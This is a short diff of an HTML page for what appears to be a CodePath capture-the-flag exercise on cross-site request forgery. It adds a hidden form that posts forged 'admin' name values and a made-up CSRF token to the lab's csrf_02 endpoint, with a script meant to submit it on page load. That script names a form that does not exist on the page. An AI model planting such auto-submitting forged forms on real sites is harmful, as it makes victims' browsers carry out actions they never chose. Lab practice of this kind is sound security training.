@@ -1,4 +1,16 @@
-<form action="/http/public/protected/flags/csrf_02/?firstname=&lastname=&csrf_token=user" method="post">
-<input type="hidden" name="crsf_token" value="dHJ5X3RoaXNfdG9rZW4%3D">
 
-</form>
+<form action="https://flags.codepath.com/http/public/protected/flags/csrf_02/" method="post" id="the_form" style="display:none" target="test">    
+
+        <input type="text" name="firstname" value="admin"  />
+        
+        <input type="text" name="lastname" value="admin"  />
+  
+        <input type="hidden" name="csrf_token" value="1"  /> 
+  
+        <input type="submit"/> 
+
+    </form> 
+
+<script>
+  document.fbctfcsrf08.submit();
+</script>
